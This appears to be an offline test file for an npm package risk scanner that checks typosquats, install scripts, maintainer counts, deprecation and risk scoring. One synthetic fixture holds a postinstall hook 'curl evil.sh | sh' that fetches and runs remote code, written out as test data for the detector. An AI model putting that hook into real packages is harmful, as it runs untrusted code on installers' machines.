// offline sanity checks — synthetic packuments, no network needed.

const checks = require("../src/checks");

let failed = 0;
function check(label, cond) {
  console.log(`${cond ? "PASS" : "FAIL"} — ${label}`);
  if (!cond) failed++;
}

// levenshtein basics
check("levenshtein kitten/sitting = 3", checks.levenshtein("kitten", "sitting") === 3);
check("levenshtein identical = 0", checks.levenshtein("lodash", "lodash") === 0);
check("levenshtein lodash/lodahs = 2", checks.levenshtein("lodash", "lodahs") === 2);

// typosquat detection
check("lodahs flagged as typosquat",
  checks.checkTyposquat("lodahs").some((f) => f.code === "TYPOSQUAT_RISK" && f.detail.includes("lodash")));
check("real lodash not flagged", checks.checkTyposquat("lodash").length === 0);
check("unrelated name not flagged", checks.checkTyposquat("definitely-not-a-real-package-xyz").length === 0);

// install scripts
const withScripts = { scripts: { postinstall: "node evil.js" } };
check("postinstall flagged",
  checks.checkInstallScripts(withScripts).some((f) => f.code === "INSTALL_SCRIPTS"));
check("no scripts clean", checks.checkInstallScripts({ scripts: { test: "jest" } }).length === 0);

// maintainers
check("zero maintainers flagged",
  checks.checkMaintainers({ maintainers: [] }).some((f) => f.code === "NO_MAINTAINERS"));
check("one maintainer flagged",
  checks.checkMaintainers({ maintainers: [{ name: "a" }] }).some((f) => f.code === "SINGLE_MAINTAINER"));
check("three maintainers clean",
  checks.checkMaintainers({ maintainers: [{}, {}, {}] }).length === 0);

// deprecated
check("deprecated flagged",
  checks.checkDeprecated({ deprecated: "don't use this" }).length === 1);

// full synthetic evil package scores HIGH+
const evilDoc = {
  maintainers: [{ name: "x" }],
  time: { "1.0.0": new Date(Date.now() - 30 * 864e5).toISOString() },
  versions: { "1.0.0": { scripts: { postinstall: "curl evil.sh | sh" }, license: "MIT", repository: {} } },
  "dist-tags": { latest: "1.0.0" },
};
const { meta } = checks.pickVersion(evilDoc, null);
const findings = [
  ...checks.checkInstallScripts(meta),
  ...checks.checkTyposquat("lodahs"),
  ...checks.checkMaintainers(evilDoc),
];
const score = findings.reduce((s, f) => s + f.score, 0);
check(`synthetic evil package scores HIGH+ (got ${checks.bandFor(score)} ${score})`,
  ["HIGH", "CRITICAL"].includes(checks.bandFor(score)));

// version picking
check("picks latest by dist-tag", checks.pickVersion(evilDoc, null).version === "1.0.0");
let threw = false;
try { checks.pickVersion(evilDoc, "9.9.9"); } catch { threw = true; }
check("unknown version throws", threw);

process.exit(failed ? 1 : 0);
